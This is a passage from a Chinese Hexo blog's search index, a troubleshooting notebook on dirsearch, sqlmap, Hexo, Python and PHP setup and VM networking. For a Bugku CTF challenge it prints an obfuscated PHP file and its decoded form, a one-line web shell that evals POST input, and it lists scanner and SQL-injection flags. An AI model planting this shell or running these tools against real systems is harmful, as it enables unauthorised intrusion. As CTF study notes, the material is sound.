class="hljs-keyword">from</span> .requests_ntlm <span class="hljs-keyword">import</span> HttpNtlmAuth<br>  <span class="hljs-keyword">File</span> <span class="hljs-string">&quot;D:\dirsearch\thirdparty\requests_ntlm\requests_ntlm.py&quot;</span>, line <span class="hljs-number">5</span>, <span class="hljs-keyword">in</span> &lt;<span class="hljs-keyword">module</span>&gt;<br>    <span class="hljs-keyword">from</span> cryptography <span class="hljs-keyword">import</span> x509<br>ModuleNotFoundError: <span class="hljs-keyword">No</span> <span class="hljs-keyword">module</span> named <span class="hljs-string">&#x27;cryptography&#x27;</span><br></code></pre></td></tr></table></figure><p>说明库没装上，可以去pycharm里自行安装完整。</p><p>附上图:</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802195925831.png"></p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200037618.png"></p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210802200638164.png"></p><p>dirseach自带的字典在db目录下，使用格式以及常用参数如下：<br>py dirsearch.py<code>-</code>u [target url]<code>-</code>e<code>*</code></p><p><strong>-<code>u后面跟要扫的url</code></strong></p><p><strong>-<code>e是指定的url</code></strong></p><p><strong>-<code>w是指定字典</code></strong></p><p><strong>-<code>r递归目录</code></strong></p><p><strong>-<code>random</code>-agents使用随机UA</strong></p><p>还可以调低线程：*<em>dirsearch.py -u url -e * –timeout=2 -t 1 -x 400,403,404,500,503,429*</em></p><h3 id="8-sqlmap的简单使用"><a href="#8-sqlmap的简单使用" class="headerlink" title="8.sqlmap的简单使用"></a>8.sqlmap的简单使用</h3><p>sqlmap -r后面跟着文件</p><p>sqlmap -u后面跟着路径（url）</p><p>sqlmap常用参数：<br>-u : 指定目标URL，sql注入点<br>–cookie : 当前会话的cookie值<br>-b : 获取数据库类型 检索数据库管理系统的标识<br>（DBMS：Database Management System 数据库管理系统）<br>–current-db : 获取当前数据库<br>–current-user :获取当前登录数据库使用的用户</p><h3 id="9-linux提示：无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够"><a href="#9-linux提示：无法打开锁文件-var-lib-dpkg-lock-open-13-权限不够" class="headerlink" title="9.linux提示：无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)"></a>9.linux提示：无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)</h3><p><a href="http://blog.csdn.net/zlchina1989/article/details/6033198">无法打开锁文件 /var/lib/dpkg/lock - open (13: 权限不够)  无法对状态列表目录加锁(/var/lib/dpkg/)，请查看您是否正以 root 用户运行？</a></p><p>解决的办法：在前面加sudo，也就是sudo apt-get install xxxxx</p><p>使得自己的指令拥有管理员权限。</p><h3 id="10-Hexo修改字体"><a href="#10-Hexo修改字体" class="headerlink" title="10.Hexo修改字体"></a>10.Hexo修改字体</h3><p><a href="https://blog.csdn.net/m0_46296826/article/details/115350456">https://blog.csdn.net/m0_46296826/article/details/115350456</a></p><h3 id="11-Hexo封面图片"><a href="#11-Hexo封面图片" class="headerlink" title="11.Hexo封面图片"></a>11.Hexo封面图片</h3><p>免费制作图床的网址：</p><p><a href="https://imgurl.org/">ImgURL免费图床</a></p><p>经过这里加工后，选择合适的路径</p><p>在博客文章的cover（可以手动添加)后面加上</p><p>就可以有漂亮的文章封面啦！</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20210830165519649.png" alt="image-20210830165519649"></p><p>不过这个是暂时的，doge</p><p>取消封面的话，只需要在cover后面加上false就好</p><h3 id="12-AttributeError-module-‘datetime’-has-no-attribute-‘now’"><a href="#12-AttributeError-module-‘datetime’-has-no-attribute-‘now’" class="headerlink" title="12.AttributeError: module ‘datetime’ has no attribute ‘now’"></a>12.AttributeError: module ‘datetime’ has no attribute ‘now’</h3><p>今天python代码出现这样的报错，</p><p>经过上网查询得知，原来是我文件命名和所调用库一样，导致</p><p>导入时回覆盖datetime库</p><p>这是别人文章的原话：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">datetime是<span class="hljs-keyword">python</span>中的内置模块，正常应该不会报错，检查后发现是一个很低级错误， 我给我的文件名起的就是datetime.<span class="hljs-keyword">py</span> 所以导入时会覆盖datetime这个包。将文件名字改了就好了。<br></code></pre></td></tr></table></figure><h3 id="13-Turtle库如何绘制用户想要图案"><a href="#13-Turtle库如何绘制用户想要图案" class="headerlink" title="13.Turtle库如何绘制用户想要图案"></a>13.Turtle库如何绘制用户想要图案</h3><p>上网查了一下，在一篇turtle文章下面找到了一句话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">用鼠标点击事先确定位置，返回值为一个坐标<br></code></pre></td></tr></table></figure><p>这句话令我想法多了起来，现有的想法是有什么代码可以把坐标值打印</p><p>然后根据坐标值编写相应的调用turtle库的代码</p><h3 id="14-ReadTimeoutError-HTTPSConnectionPool-host-’files-pythonhosted-org’-port-443-Read-timed-out"><a href="#14-ReadTimeoutError-HTTPSConnectionPool-host-’files-pythonhosted-org’-port-443-Read-timed-out" class="headerlink" title="14.ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out."></a>14.ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out.</h3><p><a href="https://www.cnblogs.com/ring1992/p/13971119.html">Python报错ReadTimeoutError: HTTPSConnectionPool(host=’files.pythonhosted.org’, port=443): Read timed out. - Ring_1992 - 博客园 (cnblogs.com)</a></p><h3 id="15-Visual-code安装php运行配置环境"><a href="#15-Visual-code安装php运行配置环境" class="headerlink" title="15.Visual code安装php运行配置环境"></a>15.Visual code安装php运行配置环境</h3><p><a href="https://www.bilibili.com/video/BV1XE41147Kc?p=1&share_medium=android&share_plat=android&share_session_id=7ca75de8-83ff-4a4b-a87e-afe4faf6360c&share_source=QQ&share_tag=s_i&timestamp=1633683248&unique_k=dejn9X">小白必看的php入门教程，php编辑神器推荐，visual studio code（vscode），教大家装插件后提高效率_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV14E411L7kL?p=1&share_medium=android&share_plat=android&share_session_id=ed416c37-a6c1-4679-82ed-5d3283230595&share_source=QQ&share_tag=s_i&timestamp=1633683271&unique_k=tORPhM">【php基础教程】php path环境变量的配置，解决vscode不能右键运行php代码的问题_哔哩哔哩_bilibili</a></p><p>第一个视频教学如何安装、建议的PHP插件，比如Run Code</p><p>第二个视频教学添加环境变量，运行是确保不会乱码</p><p>效果图：</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211009200155499.png" alt="image-20211009200155499"></p><h3 id="16-Hexo部署到coding"><a href="#16-Hexo部署到coding" class="headerlink" title="16.Hexo部署到coding"></a>16.Hexo部署到coding</h3><p>为了让我的博客访问能够更快</p><p>我今天尝试了将hexo部署到coding，费了我好大的劲（博客差点崩了，doge）</p><p>先记录一下所用的文章：</p><p><a href="https://cloud.tencent.com/developer/article/1580237">Hexo博客部署到码云和Coding - 云+社区 - 腾讯云 (tencent.com)</a></p><p><a href="https://blog.csdn.net/BEICHENx1/article/details/104237588">(5条消息) 加速Hexo博客的访问速度——将博客部署到coding_BEICHENx1的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/BlowMoons/article/details/100544444">(5条消息) Hexo部署到Coding上_BlowMoons的博客-CSDN博客_hexo部署到coding</a></p><p><a href="https://blog.csdn.net/weixin_43631997/article/details/115618569?ops_request_misc=%7B%22request_id%22:%22163411490316780264094488%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=163411490316780264094488&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-115618569.first_rank_v2_pc_rank_v29&utm_term=coding%E5%88%9B%E5%BB%BA%E9%A1%B5%E9%9D%A2&spm=1018.2226.3001.4187">(5条消息) Coding创建项目，并用git把本地上传到Coding_Aurora1217的博客-CSDN博客_coding创建目录</a></p><p><a href="https://jingyan.baidu.com/article/d2b1d102d4527e5c7e37d40d.html">Coding中如何增加SSH公钥-百度经验 (baidu.com)</a></p><p><a href="https://www.zhihu.com/question/33544309">(1 封私信 / 2 条消息) Coding.net 是什么网站？和 Github 有什么区别？ - 知乎 (zhihu.com)</a></p><h3 id="17-PHP混淆加密解密"><a href="#17-PHP混淆加密解密" class="headerlink" title="17.PHP混淆加密解密"></a>17.PHP混淆加密解密</h3><p><a href="https://www.zhaoyuanma.com/phpjm.html">php解密加密|php混淆破解|phpjm破解|phpdp神盾破解|php威盾破解|php微盾破解|tianyiw破解|php源码破解|php在线破解|php反编译|zend6解密|Zend Guard 6 破解 (zhaoyuanma.com)</a></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?php<br>define(<span class="hljs-string">&#x27;pfkzYUelxEGmVcdDNLTjXCSIgMBKOuHAFyRtaboqwJiQWvsZrPhn&#x27;</span>, __FILE_<span class="hljs-number">_</span>);<br>$cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ = urldecode(<span class="hljs-string">&quot;%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A&quot;</span>);<br>$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;3&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;6&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;33&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;30&#125;</span>;<br>$hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;33&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;10&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;24&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;10&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;24&#125;</span>;<br>$vNwTOsKPEAlLciJDBhWtRSHXempIrjyQUuGoaknYCdFzqZMxfbgV = $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ<span class="hljs-string">&#123;0&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;18&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;3&#125;</span> . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ<span class="hljs-string">&#123;0&#125;</span> . $hYXlTgBqWApObxJvejPRSdHGQnauDisfENIFyocrkULwmKMCtVzZ<span class="hljs-string">&#123;1&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;24&#125;</span>;<br>$ciMfTXpPoJHzZBxLOvngjQCbdIGkYlVNSumFrAUeWasKyEtwhDqR = $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;7&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;13&#125;</span>;<br>$BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC.= $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;22&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;36&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;29&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;26&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;30&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;32&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;35&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;26&#125;</span> . $cPIHjUYxDZVBvOTsuiEClpMXAfSqrdegyFtbnGzRhWNJKwLmaokQ<span class="hljs-string">&#123;30&#125;</span>;<br><span class="hljs-keyword">eval</span>($BwltqOYbHaQkRPNoxcfnFmzsIjhdMDAWUeKGgviVrJZpLuXETSyC(<span class="hljs-string">&quot;&quot;</span>)); ?&gt;<br></code></pre></td></tr></table></figure><p>网站解密后</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//加密方式：php源码混淆类加密。免费版地址:https://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。</span><br><span class="hljs-comment">//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 </span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br>highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);<br>@<span class="hljs-keyword">eval</span>($_POST[ymlisisisiook]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>题目地址：<a href="https://ctf.bugku.com/challenges/detail/id/107.html">getshell - Bugku CTF</a></p><h3 id="18-虚拟机无网络的问题解决"><a href="#18-虚拟机无网络的问题解决" class="headerlink" title="18.虚拟机无网络的问题解决"></a>18.虚拟机无网络的问题解决</h3><p>之前应该是为了打AWD，把网络连接配置给重置了</p><p>导致虚拟机那块的网络没有跟上，于是都没有网络 ==</p><p>还好今天试了配置ubuntu的网络</p><p>参考：<a href="https://blog.csdn.net/tiramisu_L/article/details/80398451">Ubuntu网络配置（NAT模式）_tiramisu_L的博客-CSDN博客</a></p><p>最重要还是重置了虚拟机网络配置</p><p>1.</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145702228.png" alt="image-20211022145702228"></p><p>2.</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145736426.png" alt="image-20211022145736426"></p><p>3.</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145756792.png" alt="image-20211022145756792"></p><p>4.</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145813165.png" alt="image-20211022145813165"></p><p>5.</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145828373.png" alt="image-20211022145828373"></p><p>6.</p><p><img src="/2020/10/15/2021/x/%E5%8D%9A%E5%AE%A2%E8%A7%A3%E7%96%91/image-20211022145852767.png" alt="image-20211022145852767"></p><h3 id="19-phpstudy无法启动mysql"><a href="#19-phpstudy无法启动mysql" class="headerlink" title="19.phpstudy无法启动mysql"></a>19.phpstudy无法启动mysql</h3><p>可以在CMD中输入sc delete mysql删除掉mysql,这样就可以在phpstudy中开启MySQL了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
